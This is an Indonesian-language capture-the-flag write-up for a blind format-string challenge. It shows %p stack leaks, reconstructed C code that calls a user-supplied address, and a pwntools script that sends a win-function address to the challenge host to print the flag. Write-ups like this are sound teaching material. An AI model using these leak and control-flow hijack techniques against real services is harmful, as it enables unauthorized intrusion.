# New to the Format

Service-nya blind, tapi banner-nya langsung ngasih petunjuk kalau input pertama dipass ke format string. Tes `%p` memang nge-leak stack/libc, jadi primitive awalnya jelas: format string read.

Bagian pentingnya bukan di leak panjang, tapi di flow program setelah `printf(buf)`. Dari dump `.text` via `%s` blind read, fungsi utama kelihatan seperti ini:

```c
puts("Say what you want but the route will only reveal itself if you format it correctly.");
fgets(buf, 0x80, stdin);
printf(buf);
printf("\n%s\n", "I know how to get there, but where do i go?");
scanf("%lx", &target);
((void (*)())target)();
```

Artinya input kedua dibaca sebagai angka heksadesimal lalu langsung dipanggil sebagai function pointer.

## Recon

Payload `%p %p %p ...` ngebuktiin ada format string:

```text
0x7ffff7fa5b23 0xfbad208b 0x7ffff7e9f862 (nil) ...
```

Lalu positional leak nunjukin alamat code yang stabil:

```text
%29$p -> 0x555555555209
%53$p -> 0x555555555120
```

Alamat `0x555555555209` ternyata prologue fungsi utama. Dump lanjutan di sekitar sana nunjukin ada fungsi lain di `0x5555555552d3` yang:

1. `fopen("/app/flag.txt", "r")`
2. `fgets` isi flag
3. `puts` hasilnya

Itu fungsi `win`.

## Exploit

Nggak perlu `%n`, ret2libc, atau overwrite apa pun. Cukup kirim input pertama bebas, lalu kasih alamat fungsi `win` saat prompt kedua.

```text
hello
0x5555555552d3
```

Exploit script:

```python
from pwn import remote

HOST = "w56ll430yihy.boroctf.com"
PORT = 47845
WIN = 0x5555555552D3

io = remote(HOST, PORT)
io.recvuntil(b"correctly.\n")
io.sendline(b"hello")
io.recvuntil(b"where do i go?\n")
io.sendline(hex(WIN).encode())
print(io.recvall(timeout=2).decode(errors="replace"), end="")
```

Run:

```bash
python3 solve.py
```

Output:

```text
boroCTF{%_0F_pEop!le}
```

## Flag

`boroCTF{%_0F_pEop!le}`
